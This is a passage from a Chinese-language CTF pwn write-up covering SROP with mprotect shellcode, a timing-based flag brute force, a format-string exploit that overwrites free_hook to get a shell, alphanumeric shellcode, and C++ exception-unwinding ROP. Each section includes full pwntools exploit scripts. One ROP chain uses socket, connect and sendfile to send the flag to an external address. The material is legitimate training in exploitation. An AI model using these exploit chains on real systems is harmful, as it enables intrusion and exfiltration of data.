sigframe2.rsp = bss+0xf8+0x10+0xf8+0x10
sigframe2.rip = syscall_ret

#F8
payload=p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe)+p64(0)+p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe1)
payload+=p64(0)+p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe2)
payload=payload.ljust(0x400,b"\x00")+b"flag\x00\x00\x00\x00"
sl(payload)
ru("Do u know what is SUID?")
#mydbg()
payload=b'a'*0x2a+p64(bss-0x8)+p64(leave_ret)
sl(payload)

p.interactive()
```

### Seccomp

跟上题大概逻辑一样，开的沙箱不一样，禁用了write，运行mprotect，那么利用srop 使用mprotect开辟rwx段，然后写shellcode， open 打开flag ，read 读入flag ，然后 逐个字节爆破flag。

```python
from pwn import*
context.arch='amd64'
context.log_level='debug'

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p)
	pause()
bss=0x0404060
leave_ret=0x000000000040136c
mov_rax_15_ret=0x401193 
syscall_ret=0x000000000040118a


def pwn(pos, char):
	ru("easyhack\n")

	sigframe = SigreturnFrame()
	sigframe.rax = constants.SYS_mprotect
	sigframe.rdi = 0x404000
	sigframe.rsi = 0x500
	sigframe.rdx = 7
	sigframe.rsp = bss+0xf8+0x10
	sigframe.rip = syscall_ret
	shellcode=shellcraft.open("flag")
	shellcode+=shellcraft.read(3,bss+0x500,0x50)
	shellcode+= F'''
		cmp byte ptr[rsi+{pos}], {char}
		jz loop
		ret
		loop:
		jmp loop
	'''
	#F8
	payload=p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe)+p64(0)+p64(bss+0xf8+0x10+0x10)+asm(shellcode)
	sl(payload)
	ru("Do u know what is SUID?")
	#mydbg()
	payload=b'a'*0x2a+p64(bss-0x8)+p64(leave_ret)
	sl(payload)
	#pause()	

possible_list = "-0123456789abcdefghijklmnopqrstuvwxyz{}"
flag = ""
index = 0
last = 'a'
while True:
    # 逐字符爆破
    update = False
    # 对于每个字符，遍历所有打印字符 (ascii 码从 32 到 127) 
    for ch in range(32,127):
        p=remote("47.108.206.43",24921)
        #p = process("./chall")
        # 远程比较容易断，可以多次连接
        '''
        for i in range(10):
            try:
                sh = remote("1.1.1.1", "11111")
                break
            except:
                sleep(3)
                continue
        '''
        pwn(index, ch)
        start = time.time()
        try:
            p.recv(timeout=2)
        except:
            pass
        end = time.time()
        p.close()
        # 测试接收时延，超过一定时限则说明在 pwn() 函数中插入 shellcode 后卡循环了，即 flag 中的第 index 个字符是 ch
        if(end-start > 1.5):
            flag += chr(ch)
            last = chr(ch)
            update = True
            print("[ flag + 1 !!! ] " + flag)
            break
    
    assert(update == True)
    
    if(last == '}'):
        break
    
    index += 1

print("flag: " + flag)
```

### my_QQ

参考链接：https://ycznkvrmzo.feishu.cn/docx/G17xduF91omE5nxgkgfc1W93nqb

前言：比赛时进入到了存在格式化字符串漏洞的函数，但是一直卡在rc4 加解密那里

首先介绍一下程序怎么启动

在本地目录下创下如下目录"./pem/server/"

然后使用openssl生成公私钥

```bash
openssl genrsa -out privatekey.pem 1024
openssl rsa -in privatekey.pem -out public.pem -outform PEM -pubout

```

![image-20240112200247729](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111762.png)

接着程序开启一个10000端口，并向该端口接收和发送数据

进入start_routine 函数，主要有两个功能，register 和login，接收4字节，如果为yes， 则进入login 函数，如果不是，则进入register 函数。接下来先看register 功能

![image-20240112202203477](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111763.png)

首先接收0x400字节的buf，buf 输入的内容后面进行介绍，接下来进行公钥验证，然后进入register 函数中

![image-20240112211306960](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111764.png)

verify_key 函数中，会向1000端口的socket 链接发送public key，在1000端口的socket 链接中，我们接收到该pulbic key之后再发送给该程序即可

![image-20240112212123823](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111765.png)



接下来进入register func 中，首先需要连接数据库，然后从a3（也就是上面说的0x400字节的buf ）前0x10 字节复制给user_name ，后面的0x30 字节复制给password。然后通过sql 语句查询用户是否存在，如果存在，打印该用户的的注册时间，如果不存在，则在表中创建该用户字段。

![image-20240112214416104](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111766.png)



注意需要连接mysql 数据库，因此我们需要安装mysql，并创建`my_qq`  数据库， 这俩我选择下载phpstudy 集成环境，user 表的具体字段由ida 的反汇编代码得知

![image-20240112203601236](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111767.png)

![image-20240112203937155](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111768.png)

![image-20240112211103792](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111769.png)

![image-20240112210912812](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111770.png)

接下来分析login 功能

首先接收0x400 的buf ，和register 中一样， 前0x10 字节是usrname，后0x30 字节是password，查询表中是否存在 user name 和password 相同的用户，接着是交换公钥。



![image-20240112220001934](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111771.png) 

接着传输rc4 密钥，然后进入消息传递函数中，会对接收到的消息进行rc4 解密，然后打印

![image-20240112221410349](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111772.png)

漏洞点即为格式化字符串漏洞

![image-20240112221435604](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111773.png)

利用过程类似于栈上的格式化字符串漏洞，注意到dest，也就是rc4加密后的msg 的十六进制数据，其通过strlen进行计算长度的，如果我们通过在需要rc4加密后的数据上通过`"\x00"`填充，那么后面的数据就会截断，不会对其解密。

![image-20240113020048534](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111774.png)

因此，我们在格式化字符串漏洞利用时只用对前面的`% size c% index hhn` 这些数据加密，`"\x00"`填充后跟上我们要篡改的地址即可。

> 起初我是对payload都进行了加密，发现在314偏移处存在解密后的数据，于是我对此进行任意地址写，但是发现这里程序会直接调用free，触发free_hook，这里我们仅仅只修改了一字节，会导致程序crash。
>
> ![image-20240113022026079](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111775.png)
>
> 但是为何会调用free的原因未知（下面exp中的方法就不会调用free)，我们可以考虑换一种方法，因为程序最后会调用exit(-1)，那么将exit_hook 修改为one_gadget 也是可以get shell 的。

本题的利用思路就是利用格式化字符串漏洞任意写free_hook 为system，然后发送加密后的`"/bin/sh\x00"`字符串即可getshell。

```python
from pwn import*
from Crypto.Cipher import ARC4
import base64
import struct

context.log_level='debug'
local=1
debug=1
if local:
    p_server=process('./serverpthread_rsa_hash')
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    p=remote("0.0.0.0",10000)
else:
    p_server=remote("47.108.206.43",43481)
    libc=ELF("libc-2.31.so")
    p=remote("47.108.206.43",22820)

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
#p=remote("47.108.206.43",44947)
def func(name,passwd):
	payload=name.ljust(0x10,b"\x00")+passwd.ljust(0x40,b"\x00")
	return payload
def rc4_encrypt(data, key1):
      key = key1
      print(key)
      print(len(key))
      res = ARC4.new(key).encrypt(data).hex().encode()
      return res
def int_to_bytes(num):
    # 将整数转换为字节
    byte_data = num.to_bytes((num.bit_length() + 7) // 8, 'big')
    return byte_data

#register
# s("no\x00\x00")

# s(func(b"root",b"root"))

# root_public_key=ru("-----END PUBLIC KEY-----\n")

# print(root_public_key)

# s(root_public_key)


if local:
    #local public key
    root_public_key="""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnJJhk+sxDQWZeBXmpECm
HaWTpiZIh4EQfm9irhC5wQFOByWwiCrVrdi37h43rnp0PvnXEhKgGIokdoZLl1St
NwApRX7RitZCo2V28PaQzwJwFQoy95RvvAHNn7gJSylEuKQfAbzC5oGH8IvWNokM
+wkSdtMQ9EzfKZ5eEfVJxUGofecK/4UsQqgOZPtumatJf84psQXtbQQTsw94dxoz
55JJ8z+wsaqx4v3d21pggORPv1oR1LwIpWne1yPgOW3egGtpCO4FhoclYOIFehwh
dD5aFsZ8fuRAQPMiOPOKUo5EZwz/L4eocGchQXQTK1PEBU392rnAvoee71EfSl7f
7QIDAQAB
-----END PUBLIC KEY-----
"""
else:
    # remote_public_key
    root_public_key="""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApoS1VyO6VZKyho32VC4/
btl1kgnMczBZvApAV2IC4h67fLbnnLlhOqiyIJcy6k6weK+JAdLCmquADnKJ3ZyW
eChvFKJ/L39Cb5YEZoJs3kNST0cHqtYI1bZX7vCe1KBfMPuygXxkgNTcxG4Fdzwi
SmKmYDcdDxeZP1z708x92fvPyYvFWiyaAzyw9QTqdH+JRcIRyVOdwc1ciSqqkaH4
TiOvVFHKsyInBIiF7bkl8mJMPb5vSKcVWrXHPEMcAiLmTG1mA1n/RKc+Ux3fUfjt
0UiATggCL86vCDcMhdToU+1QMdd3y+Nay9x/vm2thp/TpCl+MyzM1sld/TWJG+10
CwIDAQAB
-----END PUBLIC KEY-----
"""


p.send("yes\x00")
pause()
p.send(func(b"root",b"root"))
pause()
p.send(root_public_key)
ru("Login succeess ")
rn(0x3f0)
rc4_key=int(ru('00'),16)
rc4_key=int_to_bytes(rc4_key)

print(rc4_key)


msg = rc4_encrypt(b'%1459$p',rc4_key)
if debug:
    gdb.attach(p_server,"b *$rebase(0x000482B)")
    pause()
sl(msg)
p_server.recvuntil("The rc4_msg is")
p_server.recvuntil("The decode  rc4_msg is ")
p_server.recvline()
libc_base=int(p_server.recvuntil("\n")[:-1],16)-libc.sym['write']-100
lg("libc_base")
free_hook=libc_base+libc.sym['__free_hook']
sys_addr=libc_base+libc.sym['system']
lg("free_hook")
lg("sys_addr")
for i in range(6):
    payload1=b'%' + str(((sys_addr)>>(8*i)) & 0xff).encode() + b'c%15$hhn'
    payload1=rc4_encrypt(payload1,rc4_key)
    payload=payload1.ljust(0x48,b"\x00")+p64(free_hook+i)
    sl(payload)
    pause()
payload=rc4_encrypt(b"/bin/sh\x00",rc4_key)
sl(payload)
p.close()
p_server.interactive()
```



## NCTF

### checkin

本题开启的沙箱使用seccomp-tools 显示有点问题，应该是运行write 调用，但是要求fd为1，count 为1，read 要求fd为0，count为1。

![image-20231229152406589](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111776.png)

![image-20231229153055090](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111777.png)

程序要求我们输入可见字符，我们先利用push pop 将rax设置成当前rip 的值，然后调用ae64 将我们的输入的shellcode转化为可见字符shellcode。

所以正常写shellcode就行，比赛中我们的方法是：read 的count 可以使用0x100000001绕过，然后循环write flag即可

```python
from pwn import*
from ae64 import AE64
context.arch='amd64'
context.log_level='debug'
p=remote("8.130.35.16",58002)
#p=process(['checkin'])
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p,"b *$rebase(0x01764)")
	pause()

#0x20230000
shellcode=""
shellcode+="""
push 0x50505050
pop rax
xor rax,0x7073506c
"""
#sc=shellcraft.read(0,0x20230120,0x100000001)
flag_addr=0x20230000+0xf0+0x30
sc=f"""
push 0
pop rdi
push 3
pop rax
syscall
"""
sc+=shellcraft.open("flag")
sc+=f"""
push rax
pop rdi
push {flag_addr+0x100}
pop rsi
mov rdx,0x100000001
push 0
pop rax
syscall
"""
sc+=f"""
mov r8,0
loop:
push 1
pop rdi
push {flag_addr+0x100}
pop rsi
add rsi,r8
push 0x1
pop rdx
push 0x1
pop rax
syscall
add r8,1
jmp loop
syscall
"""
ru("Give me your shellcode:")
#mydbg()
enc_shellcode = asm(shellcode)+AE64().encode(asm(sc),'rax',0,"small")
print(hex(len(enc_shellcode)))
s(enc_shellcode.ljust(0xf0,b"A")+b"flag")
p.interactive()
```

看了出题人 的博客，才知道原来read 是可以循环读的

```python
from pwn import*
from ae64 import AE64
context.arch='amd64'
context.log_level='debug'
p=remote("8.130.35.16",58002)
#p=process(['checkin'])
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p,"b *$rebase(0x01764)")
	pause()

#0x20230000
shellcode=""
shellcode+="""
push 0x50505050
pop rax
xor rax,0x7073506c
"""
#sc=shellcraft.read(0,0x20230120,0x100000001)
flag_addr=0x20230000+0xf0+0x30
sc=f"""
push 0
pop rdi
push 3
pop rax
syscall
"""
sc+=shellcraft.open("flag")
sc+=f"""
push rax
pop rdi
inc rdx
xor rbx,rbx
read_loop:
lea rsi,[rsp+rbx]
inc rbx
xor rax,rax
syscall
cmp rax,0
jne read_loop
push 1
pop rdi
push 1
pop rdx
xor r8,r8
write_loop:
lea rsi,[rsp+r8]
inc r8
push 1
pop rax
syscall
cmp r8,rbx
jne write_loop
push 0
"""
ru("Give me your shellcode:")
#mydbg()
enc_shellcode = asm(shellcode)+AE64().encode(asm(sc),'rax',0,"small")
print(hex(len(enc_shellcode)))
s(enc_shellcode)
p.interactive()
```

### nception

这题考察的主要是c++ 的异常处理。

程序本身里有两个catch块，一个位于main中，一个位于cleanup函数中。

![image-20231230175735581](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111778.png)

在edit中，会判断 输入的buf，通过strlen(buf)计算长度，并判断其是否超过size，如果超过，就进入异常处理。

![image-20231230175820132](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111779.png)

在unwind过程中，存在恢复栈帧的过程，也就是leave_ret。

#### 思路一

main函数catch在while内部，会接着main逻辑执行，而cleanup函数中close掉012就leave_ret;return了。

那么我们就可以利用cleanup进行栈迁移，进行rop。

由于程序关闭了0，1，2

那么我们就要利用 `open("flag"),sockfd = socket(2, 1, 0),connect(sockfd, socked_addr, 16),sendfile(sockfd,flag_fd,offset,count)`，然后本机监听端口获得flag。

socket结构体的获取可参考该文章：https://blog.wingszeng.top/pwn-use-socket-to-bypass-close-out/ 

此外还需介绍一些特殊的gadget 用于设置调用函数的参数。

```assembly
0x000000000040284c : pop rbx ; pop r12 ; pop rbp ; ret

0x4022dc <__do_global_dtors_aux+28>:	add    DWORD PTR [rbp-0x3d],ebx
0x4022df <__do_global_dtors_aux+31>:	nop
0x4022e0 <__do_global_dtors_aux+32>:	ret  
```

在bss段残留的stderr stdout stdin 的libc地址，我们需要算出libc中函数地址具体这三者之一的偏移，通过上述两个gadget ，将其设置为我们想要的libc地址，接下来便是如何调用这个地址

```assembly
0x00000000004022dd : pop rbp ; ret
0x00000000004030e2 : mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax + 0x10] ; pop rbp ; ret
0x000000000040226c : jmp rax

```

通过上述gadget 我们可以控制rbp，进而控制rax，通过jmp rax 实现任意地址跳转执行。

但是程序中并没有pop rdi，rsi，rdx，这样的gadget 。

因此我们需要利用libc中的这样的gadget，来控制函数的参数，最后再调用所需要的函数。由于一个chunk的大小为0x200，所以我们需要在多个chunk 中布置rop链，通过pop rsp进行栈迁移。

> 事实上我们可以调用mprotect 函数开辟rwx段写shellcode，这样所需的字节就会少很多
>
> 另外，由于程序是使用strlen 计算 要复制buf的长度，那么如果出现ROP链中出现`"\x00"`，就会被截断，std::cin在读取字符时会跳过空白字符（空格、制表符、换行符等），所以我们需要额外判断一下，是分八字节写还是逐个字节写

```python
from pwn import*
context.arch='amd64'
#context.log_level='debug'
p=remote("8.130.35.16",58000)
#p=process("./pwn")
libc=ELF("./libc.so.6")
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p,"b *0x402441")
	pause()


def menu(choice):
	ru("Now input your choice: ")
	sl(str(choice))

def add():
	menu(1)

def edit(index,offset,content):
	menu(2)
	ru("To write object, input idx:")
	sl(str(index))
	ru("Now data offset:")
	sl(str(offset))
	ru("Now input your data:")
	s(content)

def show(idx):
	menu(3)
	ru("Which one do you want to read?")
	sl(str(idx))

def delete(idx):
	menu(4)
	ru("Which one do you want to destroy?")
	sl(str(idx))


#   0x4022dc <__do_global_dtors_aux+28>:	add    DWORD PTR [rbp-0x3d],ebx
#   0x4022df <__do_global_dtors_aux+31>:	nop
#   0x4022e0 <__do_global_dtors_aux+32>:	ret  
	
#   0x0000000000402f31 : call ptr [rbp - 0x3d]
magic_gadget=0x4022dc
stdout_addr=0x406040
stderr_addr=0x4061A0 
call_rbp=0x0000000000402f31
pop_rbx_r12_rbp_ret=0x000000000040284c #: pop rbx ; pop r12 ; pop rbp ; ret

#0x0000000000403121 : mov rax, qword ptr [rbp - 0x18] ; leave ; ret
def edit_func(index,payload):
	for i in range(0, len(payload), 8):
		edit(index, i, payload[i:i+8]+b"\n")

def edit_func1(index,offset,payload):
	for i in range(0, len(payload)):
		edit(index, i+offset, payload[i:i+1]+b"\n")

def modify(addr, offset,flag=False):
	if flag:
		print("offset=",offset)
		print(p32(offset, sign='signed'))
		pause()
	return flat([
        p64(pop_rbx_r12_rbp_ret),
        p32(offset, sign='signed') + p32(0),
		p64(0),
        p64(addr + 0x3d),
        p64(magic_gadget),
    ])

add()
delete(0)
add()
show(0)
ru("Data: ")
heap_addr=u32(rn(2).ljust(0x4,b"\x00"))<<12
lg("heap_addr")
add() #1
add() #2
add() #3
add() #4
add() #5
chunk1_addr=heap_addr+0x1100
chunk2_addr=heap_addr+0x1330
chunk3_addr=heap_addr+0x1560
chunk4_addr=heap_addr+0x1790
chunk5_addr=heap_addr+0x19c0
sock_addr=chunk1_addr+0x1d0
bss=0x4061D0
pop_rsp=0x000000000040284e #0x0000000000402577 : pop rsp ; pop r13 ; pop rbp ; ret

pop_rdi=0x0000000000027765
pop_rsi=0x0000000000028f19
pop_rdx=0x00000000000fdcfd
pop_rdx_rcx_rbx=0x00000000000edc7f #: pop rdx ; pop rcx ; pop rbx ; ret

pop_rbp=0x004030ea#: pop rbp; ret;
mov_rax=0x00000000004030e2# :# mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax + 0x10] ; pop rbp ; ret 
jmp_rax=0x00402dbe# jmp rax;
flag_addr=heap_addr+0x1100+0x30
payload=b'a'*0x3+p64(stdout_addr)+b'a'*(0x2d-0x28)+p64(0x4061A0-0x10)*3+p64(stdout_addr-0x10)+b"flag\x00\x00\x00\x00"+p64(stdout_addr+0x3d)
payload+=flat([
    modify(stderr_addr, pop_rdi- libc.sym['_IO_2_1_stderr_']),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(flag_addr),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stderr_addr, pop_rdx-0x111111-pop_rsi),
    modify(stderr_addr, 0x111111),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stdout_addr, libc.sym['open']- libc.sym['_IO_2_1_stdout_']),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(pop_rsp),
	p64(chunk2_addr-0x8+0x30)	
])
payload=payload.ljust(0x1d0,b"\x00")
edit_func(1,payload)
edit_func1(1,0x1d0,p64(0xa2217c70b8220002).ljust(16, b'\x00')) #socket struct
payload1=b'a'*0x30+flat([
    modify(stderr_addr, pop_rdi-pop_rdx),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(2),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(1),
    modify(stderr_addr, pop_rdx-0x111111-pop_rsi),
	modify(stderr_addr,0x111111),	
    p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stdout_addr,libc.sym['socket'] - libc.sym['open']),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(pop_rsp),
	p64(chunk3_addr-0x8+0x30)	
])
edit_func(2,payload1)

payload2=b'a'*0x30+flat([
    modify(stderr_addr, pop_rdi-pop_rdx),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(1),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(sock_addr),
	modify(stderr_addr, pop_rdx-0x111111-pop_rsi),
	modify(stderr_addr,0x111111),
    p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(16),
	modify(stdout_addr,libc.sym['connect'] - libc.sym['socket']),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(pop_rsp),
	p64(chunk4_addr-0x8+0x30)	
])
edit_func(3,payload2)


payload3=b'a'*0x30+flat([
    modify(stderr_addr, pop_rdi-pop_rdx),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(1),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stderr_addr, pop_rdx_rcx_rbx-0x111111-pop_rsi),
    modify(stderr_addr,0x111111),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	p64(0x50),
	p64(0),
	modify(stdout_addr,libc.sym['sendfile'] -0x111111-libc.sym['connect']),
    modify(stdout_addr,0x111111),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
])
edit_func(4,payload3)



print(hex(len(payload)))
lg("heap_addr")
#mydbg()
pause()

edit(0,0x1f0,b"a"*0x220+p64(heap_addr+0x1100+0x38)+p64(0x0402395)+b"\n")
p.interactive()

```

#### 思路二

另一种解法，可见星盟安全团队的wp：https://blog.xmcve.com/2023/12/28/NCTF2023-Writeup/#title-13

在main函数的catch 中会先执行`___cxa_begin_catch`，该函数会指向对象的指针

![image-20240104212532070](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111780.png)

![image-20240104213002056](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111781.png)

该对象的前8字节指向libc c++ 中的vtable ，后8字节指向存储字符串的堆地址。

接下来会将rax赋值给rbp-0x18 的地址。

我们可以在edit 控制rbp，然后通过错误处理执行到这里，那么 利用该条语句可以实现任意地址写。

注意到程序中的结构如下`ptr->heap->content`

我们可以通过任意地址写将rax 写到 heap 中指向content的指针，那么通过show 就可以泄露libc地址。

>  此时泄露完libc之后，可以像上面的解法一样，进行栈迁移后即可控制执行流程，且有了libc地址，可以直接利用pop rdi 这样的gadget了

另一方面，我们可以利用这个任意地址写将程序中的数据结构指针末位置0，实现错位构造，从而实现任意读写。

可以看到如果我们将ptr中存储的heap 指针末尾置0，并在其置0的位置布置好content指针，就可以实现任意地址读。

> 也可以将heap 存储的content指针末尾置0，通过edit content 就可以控制相应heap 中的content 指针和size，如heap2 heap3 heap4 heap5 heap6等，实现任意读写。

这里选择将`0x13ca0e0`置0，即`0x13ca000`,这个地址正好是heap0 的content指针偏移0x130处。

![image-20240104214237746](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111782.png)

![image-20240104214627963](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111783.png)

因此我们需要事先在heap0 的content指针偏移0x130布置好要读取的地址，然后利用异常处理中的任意地址写将prt+8处存储的heap 指针末位置0。

> 需要注意，如果直接利用异常处理中的任意地址写将prt+8处存储的heap1指针末位置0，它也会影响ptr 中存储的heap0指针。因此我们需要稍微设置一下堆布局，add7次之后，将heap1-到heap6释放，接着再把他们申请回来，由于tcache中的FILO机制，会使ptrs+8->ptrs+48 中的heap 指针逆序

![image-20240104215334455](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111784.png)

这样错位写ptrs+48 中的末尾地址仅仅会影响ptrs+40，不会影响heap0指针。

![image-20240104221426505](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111785.png) 

接下来就是先在heap0 的content指针偏移0x130处布置好got表，0x138 布置好长度，然后show(6)泄露libc

同样的方法利用environ泄露stack_addr ，并泄露canary，然后利用edit 的溢出构造好rop链即可getshell。

需要注意的使environ的地址末位为`"\x20"`,无法通过cin读入，那么我们就需要设置任意地址读environ+1，

泄露stack 的高5位字节，然后爆破canary 的位置，最后泄露出canary （泄露出的canary 不一定正确，需要多次运行），最后就是溢出写rop getshell。

```python
from pwn import*
from ae64 import AE64
context.arch='amd64'
context.log_level='debug'
#p=remote("8.130.35.16",58000)
p=process("./nception")
libc=ELF("./libc.so.6")
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p,"b *0x00402781\nb *0x0402E49\n b*0x0402E24")
	pause()


def menu(choice):
	ru("Now input your choice: ")
	sl(str(choice))

def add():
	menu(1)

def edit(index,offset,content):
	menu(2)
	ru("To write object, input idx:")
	sl(str(index))
	ru("Now data offset:")
	sl(str(offset))
	ru("Now input your data:")
	s(content)

def show(idx):
	menu(3)
	ru("Which one do you want to read?")
	sl(str(idx))

def delete(idx):
	menu(4)
	ru("Which one do you want to destroy?")
	sl(str(idx))


add()
add()
add()
add()
add()
add()
add()
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
add()
add()
add()
add()
add()
add()
edit(0, 0x130, p64(0x405FC8)+b"\n")
